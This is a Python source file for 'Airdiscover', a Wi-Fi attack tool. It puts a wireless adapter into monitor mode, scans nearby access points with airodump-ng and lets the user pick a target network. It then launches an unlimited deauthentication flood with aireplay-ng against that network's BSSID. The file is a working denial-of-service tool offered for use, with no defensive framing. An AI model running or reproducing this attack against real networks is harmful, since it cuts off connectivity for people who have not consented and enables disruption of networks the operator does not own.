import os
import colorama
import subprocess
import random
import sys
import scapy
import csv
import time
import shutil
from datetime import datetime
import time
from colorama import Fore, Back, Style
import re
colorama.init()
main = "/usr/share/airdiscover"
log = "/usr/share/airdiscover/conf/airdiscover.log"
pixie_php = "/usr/share/airdiscover/pixie.php"
version_log = "/usr/share/airdiscover/VERSION"
update_check = True
active_wireless_networks = []
INTERFACE="" #select interface
MONITOR="DISABLED"
MONITORED_INTERFACE="None"
NETWORK_SELECTED=False
BSSID="None"
ESSID="None"
CHANNEL="None"
CRYPTO="None"
if not 'SUDO_UID' in os.environ.keys():
    print(Fore.RED+'[-]'+Fore.RESET+' No root.')
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print(Fore.RED+"[-]"+Fore.RESET+" There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print(Fore.YELLOW+"[+]"+Fore.RESET+" Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)


time.sleep(1)

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
if len(check_wifi_result) == 0:
    print(Fore.RED+"[-]"+Fore.RESET+" No WiFi (WLAN) Adapters found.")
    print(Fore.CYAN+'[?]'+Fore.RESET+' Do You Want to Set The Interface Manually (Y/n)?')
    manual = str(input("> "))
    if manual == 'y' or manual == 'Y' or manual == 'yes':
        print(Fore.CYAN+'[-]'+Fore.RESET+' Please Enter The Interface Name.')
        interface_name = input("> ")
        INTERFACE=interface_name
        print(Fore.YELLOW+'[+]'+Fore.RESET+f' Set The Interface: {Fore.GREEN}{INTERFACE}{Fore.RESET}')
        time.sleep(0.8)
    else:
        sys.exit()
else:
    print(Fore.YELLOW+"[+]"+Fore.RESET+" The Following WiFi Interfaces Are Available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")
    print('-----------------------------')
    while True:
        print(Fore.YELLOW+"[+]"+Fore.RESET+" Please Select The Interface: ")
        wifi_interface_choice = int(input("> ").strip(" "))
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print(Fore.RED+"[-]"+Fore.RESET+" Please Enter a Valid Number From List.")
    INTERFACE = check_wifi_result[int(wifi_interface_choice)]
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Set The Interface: {Fore.GREEN}{INTERFACE}{Fore.RESET}')
    time.sleep(0.8)

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

def read_version():
    try:
        with open(version_log, "r") as version:
            ver = version.read()
    except Exception as version_output:
        print(Fore.RED+'[-]'+Fore.RESET+f' Error: {version_output}')
        sys.exit()
    return ver

def write_to_log(error):
    if error == 'remove_log':
        os.system(f'rm -rf {log}')
        os.system(f'touch {log}')
        sys.exit()
    try:
        with open(log, "a") as log_output:
            log_output.write(error)
    except Exception as log_write:
        print(Fore.RED+'[-]'+Fore.RESET+f' Error: {log_write}')
        sys.exit()

def banners():
    banners = [f'''
  ___  _         _ _                             
 / _ \(_)       | (_)                            
/ /_\ \_ _ __ __| |_ ___  ___ _____   _____ _ __ 
|  _  | | '__/ _` | / __|/ __/ _ \ \ / / _ \ '__| {read_version()}
| | | | | | | (_| | \__ \ (_| (_) \ V /  __/ |   
\_| |_/_|_|  \__,_|_|___/\___\___/ \_/ \___|_| By G00Dway.
'''+Style.BRIGHT+'''
+ -- =--{ '''+Fore.YELLOW+'''Airdiscover Framework'''+Fore.RESET+'''    }
     =--{ HackNET Azerbaijan Org.  }
'''+Style.RESET_ALL]
    select = random.choice(banners)
    print(select)


def load_ddos(bss, chh, monitor_num):
    def load_dos():
        print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Deauth Attack, Press CTRL + C To Stop...')
        time.sleep(1)
        subprocess.run(["airmon-ng", "start", monitor_num, chh])
        subprocess.run(["xterm", "-T", "Deauth Attack (Airdiscover)", "-e", "aireplay-ng", "--deauth", "0", "-a", bss, monitor_num])
    load_dos()
def ddos_attacks(monitor):
    def load_dos_attack():
        load_ddos(BSSID, CHANNEL, monitor)
    if ESSID == "None" or BSSID == "None" or MONITORED_INTERFACE == "None":
        print(Fore.RED+'[-]'+Fore.RESET+' Please Select a Network!')
    else:
        pass
    if INTERFACE == "":
        print(Fore.RED+'[-]'+Fore.RESET+' Please Select a Interface!')
    else:
        load_dos_attack()


# menu_scan_no_interface = Fore.LIGHTBLUE_EX+f'''
# Scan, Interface Options
# ----------------------------------{Fore.RESET}
# 1) Put Interface to monitor mode
# 2) Put interface to managed mode
# 3) Select another interface
# 4) Scan for available networks (NEEDS MONITOR MODE!)
# '''
def monitor_configure():
    global MONITOR
    if MONITOR == "DISABLED":
        MONITOR = Fore.RED+"DISABLED"+Fore.RESET
    else:
        MONITOR = Fore.LIGHTGREEN_EX+"ENABLED"+Fore.RESET

monitor_configure()
def config():
    optional_menu = Fore.LIGHTCYAN_EX+f'''
-------------------{Fore.CYAN}
Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
Target BSSID: {BSSID}
Target ESSID:{ESSID}
Channel: {CHANNEL}
Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
-------------------{Fore.RESET}

0) Exit script{Fore.LIGHTBLUE_EX}
----------------------------------

Scan, Interface Options
----------------------------------{Fore.RESET}
1) Put Interface to monitor mode
2) Put interface to managed mode
3) Clean up database files
4) Scan for available networks, select network (NEEDS MONITOR MODE!)
{Fore.LIGHTBLUE_EX}
Optional features, attacks ({Fore.RED}MONITOR MODE{Fore.LIGHTBLUE_EX})
----------------------------------{Fore.RESET}
5) Deauth Attack / Aireplay (WPA, WPA2, WEP) ({Fore.LIGHTYELLOW_EX}Aireplay-ng){Fore.RESET}
'''
    return optional_menu



os.system("clear")
banners()
def clear_print():
    os.system('clear')
    banners()
    print(config())
print(config())
while True:
    try:
        selection_attack = int(input("> "))
    except Exception as menu_error:
        print(Fore.RED+'[-]'+Fore.RESET+f' Error: {menu_error}')
        sys.exit()
    if selection_attack == '':
        print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
        time.sleep(0.5)
        clear_print()
    elif selection_attack == 0:
        top = '.'
        print(Fore.BLUE+'[*]'+Fore.RESET+' Exiting From Script...')
        time.sleep(1)
        for i in range(4):
            top+='.'
            if "....." in top or "......" in top:
                top+=Fore.GREEN+'ok'+Fore.RESET
            time.sleep(0.2)
            sys.stdout.write(f"\rCleaning up temporary files{top}")
        write_to_log("remove_log")
    elif selection_attack == 1:
        print(Fore.LIGHTBLUE_EX+'Killing Processes...'+Fore.RESET)
        kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        print(Fore.LIGHTGREEN_EX+"Putting WiFi Adapter Into Monitored Mode..."+Fore.RESET)
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", INTERFACE])
        MONITOR="ENABLED"
        monitor_configure()
        clear_print()
    elif selection_attack == 2:
        print(Fore.LIGHTBLUE_EX+'Putting Interface Into Managed Mode...'+Fore.RESET)
        put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "stop", INTERFACE])
        restart_service = subprocess.run(["sudo", "service", "NetworkManager", "restart"])
        MONITOR="DISABLED"
        monitor_configure()
        clear_print()
    elif selection_attack == 3:
        time.sleep(2)
        clear_print()
    elif selection_attack == 4:
        print(Fore.CYAN+'[?]'+Fore.RESET+' Please Enter The Monitored Name Of The Interface You Selected:')
        wifi_mon = input("> ")
        MONITORED_INTERFACE=wifi_mon
        print(Fore.BLUE+"\nPlease, Wait...")
        discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", wifi_mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            while True:
                subprocess.call("clear", shell=True)
                for file_name in os.listdir():
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                        if ".csv" in file_name:
                            with open(file_name) as csv_h:
                                csv_h.seek(0)
                                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                                for row in csv_reader:
                                    if row["BSSID"] == "BSSID":
                                        pass
                                    elif row["BSSID"] == "Station MAC":
                                        break
                                    elif check_for_essid(row["ESSID"], active_wireless_networks):
                                        active_wireless_networks.append(row)

                print(Fore.BLUE+"[*]"+Fore.RESET+" Scanning... Press Ctrl+C when you want to select\n")
                print(Fore.GREEN+"No |\tBSSID              |\tChannel|\tESSID                         |")
                print(Fore.GREEN+"___|\t___________________|\t_______|\t______________________________|")
                for index, item in enumerate(active_wireless_networks):
                    print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                time.sleep(0.5)

        except KeyboardInterrupt:
            print("")
        while True:
            print(Fore.CYAN+"[?]"+Fore.RESET+" Please select your choice: ")
            choice = input("> ")
            try:
                if active_wireless_networks[int(choice)]:
                    break
            except:
                print(Fore.RED+"[-]"+Fore.RESET+" Please try again.")
        hackbssid = active_wireless_networks[int(choice)]["BSSID"]
        hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
        hackessid = active_wireless_networks[int(choice)]["ESSID"]
        with open("/usr/share/airdiscover/temp/settings/target-bssid.txt", 'w') as target_bssid:
            target_bssid.write(hackbssid)
        with open("/usr/share/airdiscover/temp/settings/target-channel.txt", 'w') as target_channel:
            target_channel.write(hackchannel)
        BSSID = hackbssid
        CHANNEL = hackchannel
        ESSID = hackessid
        clear_print()
    elif selection_attack == 5:
        ddos_attacks(MONITORED_INTERFACE)
        clear_print()
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
        time.sleep(0.5)
        clear_print()
